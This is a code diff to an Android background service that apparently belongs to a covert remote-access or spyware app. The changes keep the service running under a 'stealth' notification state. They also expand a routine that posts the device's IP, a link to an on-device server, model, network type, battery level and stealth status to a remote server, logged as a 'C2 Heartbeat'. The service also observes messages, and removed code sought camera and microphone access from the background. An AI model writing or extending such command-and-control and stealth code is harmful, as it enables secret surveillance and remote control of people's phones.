@@ -6,6 +6,7 @@ import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
@@ -156,48 +157,32 @@ else if ("STOP".equals(action)) {
     }
 
     private void ensureForeground() {
-        // Check if we have permissions before attempting to start as FGS with specific types
-        boolean hasFineLocation = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED;
-        boolean hasCoarseLocation = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED;
-        boolean hasCamera = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED;
-        boolean hasMic = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED;
-
+        if (isForeground) {
+            // Update existing notification to match current stealth state
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.notify(NOTIFICATION_ID, createNotification());
+            }
+            return;
+        }
+        
         Notification notification = createNotification();
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                int serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
-                
-                if (hasFineLocation || hasCoarseLocation) {
-                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+                try {
+                    startForeground(NOTIFICATION_ID, notification, serviceType);
+                    isForeground = true;
+                } catch (Exception e) {
+                    startForeground(NOTIFICATION_ID, notification);
+                    isForeground = true;
                 }
-                
-                // Add Camera and Microphone types to allow starting other services with these types from background
-                if (hasCamera) {
-                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
-                }
-                if (hasMic) {
-                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
-                }
-
-                startForeground(NOTIFICATION_ID, notification, serviceType);
-                isForeground = true;
             } else {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error starting foreground: " + e.getMessage());
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                try {
-                    startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-                    isForeground = true;
-                } catch (Exception e2) {
-                    Log.e(TAG, "Critical failure starting foreground", e2);
-                    isForeground = false;
-                }
-            } else {
-                isForeground = false;
-            }
+            Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
         }
     }
 
@@ -296,12 +281,20 @@ else if ("STOP".equals(action)) {
 
     @Override
     public void onDestroy() {
-        unregisterNetworkCallback();
-        if (messageObserver != null) {
-            getContentResolver().unregisterContentObserver(messageObserver);
-        }
-        stopServer();
-        networkExecutor.shutdownNow();
+        isRunning = false;
+        // Clean up resources immediately on background thread
+        networkExecutor.execute(() -> {
+            unregisterNetworkCallback();
+            if (messageObserver != null) {
+                try {
+                    getContentResolver().unregisterContentObserver(messageObserver);
+                } catch (Exception ignored) {}
+            }
+            if (server != null) {
+                try { server.stop(); } catch (Exception ignored) {}
+            }
+            networkExecutor.shutdownNow();
+        });
         super.onDestroy();
     }
 
@@ -369,23 +362,40 @@ else if ("STOP".equals(action)) {
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "application/json");
 
-            // Send JSON with IP, Port, Device Info, and Link
+            // --- ADVANCED TELEMETRY ---
             String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":8080";
             
-            // Add extra info to help diagnose connection issues
             String networkType = "Unknown";
-            if (connectivityManager != null) {
-                android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
-                android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
-                if (caps != null) {
-                    if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
-                    else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
+            int batteryLevel = -1;
+            try {
+                // Get Network Type
+                if (connectivityManager != null) {
+                    android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
+                    android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
+                    if (caps != null) {
+                        if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
+                        else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
+                    }
                 }
-            }
+                // Get Battery Level
+                android.content.Intent batteryStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
+                if (batteryStatus != null) {
+                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                    batteryLevel = (int) ((level / (float) scale) * 100);
+                }
+            } catch (Exception ignored) {}
 
-            String jsonInputString = "{\"ip\": \"" + ip + "\", \"port\": 8080, \"device\": \"" + Build.MODEL
-                    + "\", \"network\": \"" + networkType + "\", \"link\": \"" + link + "\"}";
+            String jsonInputString = "{" +
+                "\"ip\": \"" + ip + "\", " +
+                "\"port\": 8080, " +
+                "\"device\": \"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\", " +
+                "\"network\": \"" + networkType + "\", " +
+                "\"battery\": \"" + batteryLevel + "%\", " +
+                "\"stealth\": " + isStealthMode() + ", " +
+                "\"link\": \"" + link + "\"" +
+                "}";
 
             try (OutputStream os = conn.getOutputStream()) {
                 byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
@@ -393,10 +403,10 @@ else if ("STOP".equals(action)) {
             }
 
             int code = conn.getResponseCode();
-            Log.d(TAG, "Report IP Response Code: " + code);
+            Log.d(TAG, "C2 Heartbeat Response: " + code);
 
         } catch (Exception e) {
-            Log.e(TAG, "Failed to report IP: " + e.getMessage());
+            Log.e(TAG, "Failed to report telemetry: " + e.getMessage());
         }
     }
 }
